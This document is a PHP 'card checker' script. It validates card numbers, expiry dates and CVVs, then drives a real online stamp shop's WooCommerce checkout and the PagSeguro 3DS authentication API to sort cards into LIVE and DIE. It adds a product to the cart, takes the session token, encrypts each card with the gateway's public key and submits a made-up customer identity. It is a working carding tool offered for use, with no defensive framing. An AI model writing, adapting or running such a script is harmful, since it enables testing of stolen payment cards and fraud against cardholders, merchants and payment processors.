<?php
error_reporting(0);

// Configurações
$proxy = "";
$userpass = ""; 
$tipo = "HTTP";
$pkey = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAh4QVhQTUbQO9PSeQB5r9f8J7CC5wYV9QgBVt1VTQb6fyepuG5NmSlsGJuvQOs1kTPPWC8b4r7nF8jfcd1S88PU3XkZCElWJipKhTUmMEjhY35a9N8e9J4zDHfa6PaDSavNbH1FJ5yDPmGy+v6UE4wIyaesI8a2N461GeIpU+qvqJoJk6lqmOe7rnX4SrKltgEop2MkT43f5Yr7ABEmMZBhqnfvaj4V0eE5WYkxZvw0Eprg3YM4VhRTEYGTFamgjJi+9SqY0R8uSt54rLcQDkz3J7AnecA8wp4fcgfN6BAAwaSehFIFBsdlYb7SyOsW3cGg9InjjIY101qqX1NJgawQIDAQAB";

$mesAtual = date('m');
$anoAtual = date('Y');

function getStr($str, $start, $end) {
    if (!$str) return '';
    $p1 = strpos($str, $start);
    if ($p1 === false) return '';
    $p1 += strlen($start);
    $p2 = strpos($str, $end, $p1);
    if ($p2 === false) return '';
    return substr($str, $p1, $p2 - $p1);
}

function multiexplode($str) {
    return preg_split('/[|;:\/»«><\s]+/', $str, -1, PREG_SPLIT_NO_EMPTY);
}

function validarLuhn($numero) {
    $numero = preg_replace('/[^0-9]/', '', $numero);
    $soma = 0;
    $alternar = false;
    
    for ($i = strlen($numero) - 1; $i >= 0; $i--) {
        $digito = (int)$numero[$i];
        
        if ($alternar) {
            $digito *= 2;
            if ($digito > 9) {
                $digito -= 9;
            }
        }
        
        $soma += $digito;
        $alternar = !$alternar;
    }
    
    return ($soma % 10 === 0);
}

function identificarBandeira($cc) {
    $cc = preg_replace('/[^0-9]/', '', $cc);
    
    $padroes = [
        'visa' => '/^4[0-9]/',
        'mastercard' => '/^5[1-5]/',
        'amex' => '/^3[47]/',
        'elo' => '/^(4011|4312|4389|4514|4576|5041|5066|5090|5099|6277|6362|6363|6504|6505|6509|6516|6550)/',
        'hipercard' => '/^(3841|6062|6370)/',
        'discover' => '/^6(011|221|5|4|3)/',
        'jcb' => '/^35/',
        'aura' => '/^50/',
    ];
    
    foreach ($padroes as $bandeira => $padrao) {
        if (preg_match($padrao, $cc)) {
            return $bandeira;
        }
    }
    
    return 'desconhecida';
}

function validarCVV($cvv, $bandeira) {
    $cvv = preg_replace('/[^0-9]/', '', $cvv);
    
    if ($bandeira === 'amex') {
        return (strlen($cvv) === 4);
    } else {
        return (strlen($cvv) === 3);
    }
}

function validarDataExpiracao($mes, $ano, $mesAtual, $anoAtual) {
    if (strlen($ano) == 2) {
        $ano = '20' . $ano;
    }
    
    $mes = (int)$mes;
    $ano = (int)$ano;
    
    $dataCartao = mktime(0, 0, 0, $mes, 1, $ano);
    $dataAtual = mktime(0, 0, 0, $mesAtual, 1, $anoAtual);
    $dataProximoMes = mktime(0, 0, 0, $mesAtual + 1, 1, $anoAtual);
    
    return ($dataCartao >= $dataProximoMes);
}

$lista = $_GET['lista'] ?? '';
$a = multiexplode($lista);

if (count($a) < 4) {
    die("ERROR: Formato inválido - Use CC|MÊS|ANO|CVV");
}

$cc  = preg_replace('/[^0-9]/', '', $a[0] ?? '');
$mes = preg_replace('/[^0-9]/', '', $a[1] ?? '');
$ano = preg_replace('/[^0-9]/', '', $a[2] ?? '');
$cvv = preg_replace('/[^0-9]/', '', $a[3] ?? '');

$erros = [];

if (!validarLuhn($cc)) {
    $erros[] = "INVALID_CARD";
}

$bandeira = identificarBandeira($cc);
if (!validarCVV($cvv, $bandeira)) {
    $erros[] = "INVALID_CVV";
}

if (!validarDataExpiracao($mes, $ano, $mesAtual, $anoAtual)) {
    $erros[] = "EXPIRED_CARD";
}

if (!empty($erros)) {
    echo "DIE - {$cc}|{$mes}|{$ano}|{$cvv}\n";
    echo "Motive: " . implode(", ", $erros) . "\n";
    exit;
}

$cookieFile = __DIR__ . '/cookie.txt';
if (file_exists($cookieFile)) {
    unlink($cookieFile);
}

function criptografarCartao($numero, $mes, $ano, $cvv) {
    global $pkey;
    $payload = $numero . ';' . $cvv . ';' . $mes . ';' . $ano . ';louco sonhador;' . time() . '000';
    $pem = "-----BEGIN PUBLIC KEY-----\n" . wordwrap($pkey, 64, "\n", true) . "\n-----END PUBLIC KEY-----";
    $chave = openssl_pkey_get_public($pem);
    openssl_public_encrypt($payload, $criptografado, $chave);
    return base64_encode($criptografado);
}

$curl = curl_init();
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($curl, CURLOPT_MAXREDIRS, 10);
curl_setopt($curl, CURLOPT_TIMEOUT, 30);
curl_setopt($curl, CURLOPT_ENCODING, '');
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($curl, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($curl, CURLOPT_HTTPHEADER, [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: pt-BR,pt;q=0.9',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
]);

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://filateliahalibunani.com?wc-ajax=add_to_cart',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'product_id=112256&quantity=1',
]);

$addcart = curl_exec($curl);

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://filateliahalibunani.com/finalizar-compra/',
  CURLOPT_CUSTOMREQUEST => 'GET',
]);
$checkout = curl_exec($curl);

$jwt = getStr($checkout, 'pagseguro_connect_3d_session = \'', '\'');
$nonce = getStr($checkout, 'rm_pagbank_nonce = "', '"');

$encrypted = criptografarCartao($cc, $mes, $ano, $cvv);

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://sdk.pagseguro.com/checkout-sdk/3ds/authentications',
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"paymentMethod":{"type":"CREDIT_CARD","installments":7,"card":{"encrypted":"'.$encrypted.'"}},"dataOnly":false,"customer":{"name":"Kiko na vara","email":"zvzin7@gmail.com","phones":[{"country":"55","area":"20","number":"74075634","type":"MOBILE"}]},"amount":{"value":3537,"currency":"BRL"},"billingAddress":{"street":"R ORLANDO DANTAS","number":"41","complement":"n/d","regionCode":"RJ","country":"BRA","city":"Rio de Janeiro","postalCode":"22231010"},"deviceInformation":{"httpBrowserColorDepth":24,"httpBrowserJavaEnabled":false,"httpBrowserJavaScriptEnabled":true,"httpBrowserLanguage":"pt-BR","httpBrowserScreenHeight":329,"httpBrowserScreenWidth":526,"httpBrowserTimeDifference":180,"httpDeviceChannel":"Browser","userAgentBrowserValue":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36"}}',
  CURLOPT_HTTPHEADER => [
    'Content-Type: application/json',
    'authorization: '.$jwt,
    'origin: https://filateliahalibunani.com',
    'referer: https://filateliahalibunani.com/',
  ],
]);

$resposta_auth = curl_exec($curl);
$dados_auth = json_decode($resposta_auth, true);
$id = $dados_auth['id'] ?? '';

if ($dados_auth['status'] === 'APPROVED_NO_AUTH' ) {
    echo "LIVE - {$cc}|{$mes}|{$ano}|{$cvv} - APPROVED_NO_AUTH\n";
    exit;
} elseif ($dados_auth['status'] === 'AUTH_NOT_SUPPORTED' ) {
    echo "DIE - {$cc}|{$mes}|{$ano}|{$cvv} - AUTH_NOT_SUPPORTED\n";
    exit;
}

curl_setopt_array($curl, [
    CURLOPT_URL => 'https://sdk.pagseguro.com/checkout-sdk/3ds/authentications/' . $id,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => '',
    CURLOPT_HTTPHEADER => [
        'Content-Type: application/json',
        'authorization: ' . $jwt,
        'origin: https://filateliahalibunani.com',
        'referer: https://filateliahalibunani.com/'
    ]
]);
    
$resposta_confirm = curl_exec($curl);
$status = getStr($resposta_confirm, 'status":"', '"');
$dados_confirm = json_decode($resposta_confirm, true);

if ($dados_confirm['status'] === 'SUCCESS') {
    echo "LIVE - {$cc}|{$mes}|{$ano}|{$cvv} - SUCCESS\n";
    exit;
} elseif ($dados_confirm['status'] === 'REQUIRE_CHALLENGE') {
    $acs_url = getStr($resposta_confirm, '"acsUrl":"', '"');
    $creq = getStr($resposta_confirm, '"payload":"', '"');
}

curl_setopt_array($curl, [
    CURLOPT_URL => $acs_url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => 'creq=' . $creq,
    CURLOPT_HTTPHEADER => [
        'Content-Type: application/x-www-form-urlencoded',
        'origin: https://filateliahalibunani.com',
    ],
]);
    
$result = curl_exec($curl);
$json_data = json_decode($result, true);

if ($json_data && isset($json_data['message'])) {
    echo "LIVE - {$cc}|{$mes}|{$ano}|{$cvv} - {$json_data['message']}\n";
}
elseif ($json_data && isset($json_data['statusMessage'])) {
    echo "LIVE - {$cc}|{$mes}|{$ano}|{$cvv} - {$json_data['statusMessage']}\n";
}
elseif ($json_data && isset($json_data['returnCode'])) {
    echo "LIVE - {$cc}|{$mes}|{$ano}|{$cvv} - {$json_data['returnCode']}\n";
}
else {
    $retorno = trim(strip_tags(getStr($result, '<div class="container_body_text">', '</div>')));
    if (empty($retorno)) {
        $retorno = trim(strip_tags(getStr($result, '<div class="challengeInfoText"><p>', '</p>')));
    }
    if (empty($retorno)) {
        $retorno = trim(strip_tags(getStr($result, '<title>', '</title>')));
    }
    $retorno = trim(html_entity_decode(strip_tags($retorno)));
    $retorno = preg_replace('/\s+/', ' ', $retorno);

    if (!empty($retorno)) {
        echo "LIVE - {$cc}|{$mes}|{$ano}|{$cvv} - {$retorno}\n";
    }
    else {
        echo "DIE - {$cc}|{$mes}|{$ano}|{$cvv} - {$status}\n";
    }
}

@unlink($cookieFile);
?>
